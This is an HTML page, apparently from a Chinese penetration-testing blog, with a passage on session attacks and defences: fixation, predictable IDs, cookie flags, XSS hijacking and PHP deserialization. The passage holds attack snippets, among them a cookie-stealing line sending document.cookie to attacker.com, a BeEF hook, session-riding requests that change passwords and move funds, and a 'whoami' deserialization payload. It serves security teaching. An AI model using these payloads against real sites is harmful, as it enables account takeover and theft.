@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="系统梳理 Session 安全攻击面：Session 固定、ID 可预测性、Cookie 属性绕过、XSS 劫持、PHP&#x2F;Java 反序列化、超时缺陷及纵深防御实践。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Session安全攻防 — 从会话固定到反序列化的攻击链与防御">
+<meta property="og:url" content="https://congliang.github.io/Session-attacks/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="系统梳理 Session 安全攻击面：Session 固定、ID 可预测性、Cookie 属性绕过、XSS 劫持、PHP&#x2F;Java 反序列化、超时缺陷及纵深防御实践。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-15T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.953Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Session-attacks/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Session-attacks/","path":"Session-attacks/","title":"Session安全攻防 — 从会话固定到反序列化的攻击链与防御"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Session安全攻防 — 从会话固定到反序列化的攻击链与防御 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Session-%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB-Session-Fixation"><span class="nav-number">2.</span> <span class="nav-text">一、Session 固定攻击 (Session Fixation)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Session-ID-%E5%8F%AF%E9%A2%84%E6%B5%8B%E6%80%A7"><span class="nav-number">3.</span> <span class="nav-text">二、Session ID 可预测性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Cookie-%E5%AE%89%E5%85%A8%E5%B1%9E%E6%80%A7%EF%BC%9ASecure-HttpOnly-SameSite"><span class="nav-number">4.</span> <span class="nav-text">三、Cookie 安全属性：Secure &#x2F; HttpOnly &#x2F; SameSite</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Secure-%E2%80%94-%E7%BC%BA%E5%88%99-MITM-%E7%AA%83%E5%8F%96"><span class="nav-number">4.1.</span> <span class="nav-text">Secure — 缺则 MITM 窃取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HttpOnly-%E2%80%94-%E7%BC%BA%E5%88%99-XSS-%E7%9B%B4%E6%8E%A5%E7%AA%83%E5%8F%96"><span class="nav-number">4.2.</span> <span class="nav-text">HttpOnly — 缺则 XSS 直接窃取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#SameSite"><span class="nav-number">4.3.</span> <span class="nav-text">SameSite</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E7%BC%80%E5%8A%A0%E5%9B%BA"><span class="nav-number">4.4.</span> <span class="nav-text">前缀加固</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81XSS-%E5%8A%AB%E6%8C%81-Session"><span class="nav-number">5.</span> <span class="nav-text">四、XSS 劫持 Session</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB"><span class="nav-number">6.</span> <span class="nav-text">五、Session 反序列化攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.1.</span> <span class="nav-text">PHP Session 反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java-Session-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">6.2.</span> <span class="nav-text">Java Session 反序列化</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1"><span class="nav-number">6.3.</span> <span class="nav-text">防御</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81Session-%E8%B6%85%E6%97%B6%E4%B8%8E%E5%B9%B6%E5%8F%91%E6%8E%A7%E5%88%B6"><span class="nav-number">7.</span> <span class="nav-text">六、Session 超时与并发控制</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E9%98%B2%E5%BE%A1%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="nav-number">8.</span> <span class="nav-text">七、防御最佳实践</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">9.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Session-attacks/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Session安全攻防 — 从会话固定到反序列化的攻击链与防御 | 渗透测试实战记录">
+      <meta itemprop="description" content="系统梳理 Session 安全攻击面：Session 固定、ID 可预测性、Cookie 属性绕过、XSS 劫持、PHP&#x2F;Java 反序列化、超时缺陷及纵深防御实践。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Session安全攻防 — 从会话固定到反序列化的攻击链与防御
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-08-15 08:00:00" itemprop="dateCreated datePublished" datetime="2026-08-15T08:00:00+08:00">2026-08-15</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">系统梳理 Session 安全攻击面：Session 固定、ID 可预测性、Cookie 属性绕过、XSS 劫持、PHP/Java 反序列化、超时缺陷及纵深防御实践。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Session 是 Web 应用维持用户状态的核心机制：用户登录后服务端创建 Session 并通过 Cookie 下发 ID，后续凭此恢复上下文。Session 一旦被窃取或操纵，攻击者可绕过认证直接接管账户。常见 Session Cookie 名称有 PHP 的 <code>PHPSESSID</code>、Java 的 <code>JSESSIONID</code>、ASP.NET 的 <code>ASP.NET_SessionId</code>、Node.js 的 <code>connect.sid</code> 等。<br><strong>免责声明：本文仅供安全研究与学习参考，严禁利用文中技术进行非法攻击。作者对读者使用文中信息导致的任何后果不承担法律责任。</strong></p>
+<hr>
+<h2 id="一、Session-固定攻击-Session-Fixation"><a href="#一、Session-固定攻击-Session-Fixation" class="headerlink" title="一、Session 固定攻击 (Session Fixation)"></a>一、Session 固定攻击 (Session Fixation)</h2><p>攻击者先获取一个有效 Session ID，诱骗受害者用该 ID 登录，受害者认证后攻击者以同 ID 即可接管账户。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// php.ini 危险配置 — 允许 URL 传递 Session ID</span></span><br><span class="line">session.use_trans_sid = <span class="number">1</span>       <span class="comment">// 自动将 SID 附加到 URL</span></span><br><span class="line">session.use_only_cookies = <span class="number">0</span>    <span class="comment">// 允许 URL 参数设置 SID</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 钓鱼链接：受害者登录后 SID 不变，攻击者用同 SID 即可接管 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://bank.com/login.php?PHPSESSID=abc123&quot;</span>&gt;</span>点击领取优惠券<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>也能通过中间人注入 Cookie：<code>Set-Cookie: JSESSIONID=FIXED; Domain=.target.com; Path=/</code>。<br><strong>渗透测试：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -v https://target.com/ 2&gt;&amp;1 | grep -i set-cookie   <span class="comment"># 获取干净 SID</span></span><br><span class="line"><span class="comment"># 受害者登录后，攻击者以同 SID 访问</span></span><br><span class="line">curl -b <span class="string">&quot;JSESSIONID=FIXED_SID&quot;</span> https://target.com/dashboard</span><br></pre></td></tr></table></figure>
+<p><strong>防御 — 任何权限提升后重新生成 Session ID：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_regenerate_id</span>(<span class="literal">true</span>);  <span class="comment">// PHP: true 删除旧文件</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HttpSession</span> <span class="variable">old</span> <span class="operator">=</span> request.getSession(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (old != <span class="literal">null</span>) old.invalidate();</span><br><span class="line"><span class="type">HttpSession</span> <span class="variable">s</span> <span class="operator">=</span> request.getSession(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.clear()          <span class="comment"># Flask</span></span><br><span class="line">session[<span class="string">&#x27;user_id&#x27;</span>] = user.<span class="built_in">id</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="二、Session-ID-可预测性"><a href="#二、Session-ID-可预测性" class="headerlink" title="二、Session ID 可预测性"></a>二、Session ID 可预测性</h2><p>生成算法不够随机时，攻击者可预测他人 SID 实现无接触劫持。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sid</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">time</span>());                         <span class="comment">// 一天 86400 种可能，枚举数秒</span></span><br><span class="line"><span class="variable">$sid</span> = <span class="variable">$lastId</span> + <span class="number">1</span>;                          <span class="comment">// 递增序列，相邻尝试即可</span></span><br><span class="line"><span class="variable">$sid</span> = <span class="title function_ invoke__">base64</span>(<span class="variable">$username</span> . <span class="string">&quot;:&quot;</span> . <span class="variable">$ip</span>);       <span class="comment">// 知道用户名即可构造</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>手动熵值分析：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">sids = [requests.get(<span class="string">&#x27;https://target.com/&#x27;</span>).cookies.get(<span class="string">&#x27;JSESSIONID&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;唯一 SID: <span class="subst">&#123;<span class="built_in">len</span>(<span class="built_in">set</span>(sids))&#125;</span>/100&quot;</span>)     <span class="comment"># 应接近 100</span></span><br><span class="line">lengths = [<span class="built_in">len</span>(s) <span class="keyword">for</span> s <span class="keyword">in</span> sids]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;长度: <span class="subst">&#123;<span class="built_in">min</span>(lengths)&#125;</span>-<span class="subst">&#123;<span class="built_in">max</span>(lengths)&#125;</span>&quot;</span>)  <span class="comment"># 应固定</span></span><br></pre></td></tr></table></figure>
+<p>Burp Sequencer 分析关注 FIPS-140 熵值 &gt;&#x3D; 128 bits 及每字符位熵分布。<br><strong>防御：</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SecureRandom</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecureRandom</span>(); <span class="type">byte</span>[] b = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">32</span>]; r.nextBytes(b);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();  <span class="comment">// PHP 内置用 /dev/urandom，勿自己造轮子</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="三、Cookie-安全属性：Secure-HttpOnly-SameSite"><a href="#三、Cookie-安全属性：Secure-HttpOnly-SameSite" class="headerlink" title="三、Cookie 安全属性：Secure &#x2F; HttpOnly &#x2F; SameSite"></a>三、Cookie 安全属性：Secure &#x2F; HttpOnly &#x2F; SameSite</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: SESSIONID=abc123; Secure; HttpOnly; SameSite=Lax; Path=/</span><br><span class="line">            │                │        │           └─ 跨站控制</span><br><span class="line">            │                │        └─ JS 不可读</span><br><span class="line">            │                └─ 仅 HTTPS</span><br></pre></td></tr></table></figure>
+
+<h3 id="Secure-—-缺则-MITM-窃取"><a href="#Secure-—-缺则-MITM-窃取" class="headerlink" title="Secure — 缺则 MITM 窃取"></a>Secure — 缺则 MITM 窃取</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i eth0 -A <span class="string">&#x27;tcp port 80&#x27;</span> | grep -i <span class="string">&quot;Cookie:&quot;</span>   <span class="comment"># 授权测试</span></span><br></pre></td></tr></table></figure>
+<p><strong>HSTS 旁路</strong> — HTTP 子域注入 Cookie 覆盖 HTTPS 父域：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>SESSIONID=malicious; Domain=.target.com; Path=/</span><br></pre></td></tr></table></figure>
+
+<h3 id="HttpOnly-—-缺则-XSS-直接窃取"><a href="#HttpOnly-—-缺则-XSS-直接窃取" class="headerlink" title="HttpOnly — 缺则 XSS 直接窃取"></a>HttpOnly — 缺则 XSS 直接窃取</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Image</span>().<span class="property">src</span> = <span class="string">&#x27;https://attacker.com/log?&#x27;</span> + <span class="variable language_">document</span>.<span class="property">cookie</span>;  <span class="comment">// 窃取 Session</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>HttpOnly 不是 XSS 的绝对防护</strong> — 攻击者仍可在受害者浏览器内发起自动携带 Cookie 的请求（见第四章）。</p>
+<h3 id="SameSite"><a href="#SameSite" class="headerlink" title="SameSite"></a>SameSite</h3><table>
+<thead>
+<tr>
+<th>值</th>
+<th>行为</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Strict</td>
+<td>完全禁跨站发送</td>
+</tr>
+<tr>
+<td>Lax</td>
+<td>仅同站请求 + 顶级 GET 导航携带（Chrome 默认）</td>
+</tr>
+<tr>
+<td>None</td>
+<td>全部携带，必配 Secure</td>
+</tr>
+</tbody></table>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Lax 下顶级 GET 导航仍生效 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://bank.com/deleteAccount&quot;</span>&gt;</span>点击抽奖<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="前缀加固"><a href="#前缀加固" class="headerlink" title="前缀加固"></a>前缀加固</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>__Host-session=abc123; Path=/; Secure; HttpOnly; SameSite=Lax</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>__Secure-session=abc123; Path=/; Secure</span><br></pre></td></tr></table></figure>
+<p><code>__Host-</code> 强制 Secure + Path&#x3D;&#x2F; + 无 Domain；<code>__Secure-</code> 强制 Secure。浏览器拒收不合规前缀。</p>
+<hr>
+<h2 id="四、XSS-劫持-Session"><a href="#四、XSS-劫持-Session" class="headerlink" title="四、XSS 劫持 Session"></a>四、XSS 劫持 Session</h2><p><strong>直接窃取（缺 HttpOnly）：</strong> XSS → <code>document.cookie</code> → 自建接收器 → 导入浏览器 → 身份接管。</p>
+<p><strong>Session Riding（有 HttpOnly 仍可操作）</strong> — 无需读 Cookie，直接在受害者浏览器发请求：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 改密码</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/api/changePassword&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">newPassword</span>: <span class="string">&#x27;hacked&#x27;</span>, <span class="attr">confirmPassword</span>: <span class="string">&#x27;hacked&#x27;</span>&#125;),</span><br><span class="line">    <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加攻击者邮箱 → 密码重置接管</span></span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/settings/security/addBackupEmail&#x27;</span>, &#123;</span><br><span class="line">    <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">body</span>: <span class="string">&#x27;email=attacker@evil.com&#x27;</span>, <span class="attr">credentials</span>: <span class="string">&#x27;include&#x27;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 转账</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">x.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;/api/transfer&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">x.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">x.<span class="title function_">send</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">to</span>: <span class="string">&#x27;attacker&#x27;</span>, <span class="attr">amount</span>: <span class="number">9999</span>&#125;));</span><br></pre></td></tr></table></figure>
+
+<p><strong>BeEF 持久化：</strong> <code>&lt;script src=&quot;//attacker.com:3000/hook.js&quot;&gt;&lt;/script&gt;</code> 上线后 300+ 命令模块。<br><strong>防御：</strong> 输出编码 + CSP（根本）；HttpOnly（降影响不消除）；关键操作二次验证；IP&#x2F;UA 绑定。</p>
+<hr>
+<h2 id="五、Session-反序列化攻击"><a href="#五、Session-反序列化攻击" class="headerlink" title="五、Session 反序列化攻击"></a>五、Session 反序列化攻击</h2><h3 id="PHP-Session-反序列化"><a href="#PHP-Session-反序列化" class="headerlink" title="PHP Session 反序列化"></a>PHP Session 反序列化</h3><p>处理器差异（php &#x2F; php_serialize &#x2F; php_binary）结合用户可控数据写入 Session 触发攻击：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 服务端代码</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;user_input&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];  <span class="comment">// 攻击者可控</span></span><br><span class="line"><span class="comment">// 攻击 Payload: ?data=|O:8:&quot;EvilClass&quot;:1:&#123;s:4:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</span></span><br><span class="line"><span class="comment">// &quot;|&quot; 后内容被当序列化对象，触发 __wakeup() / __destruct()</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Pop Chain 起点：</strong></p>
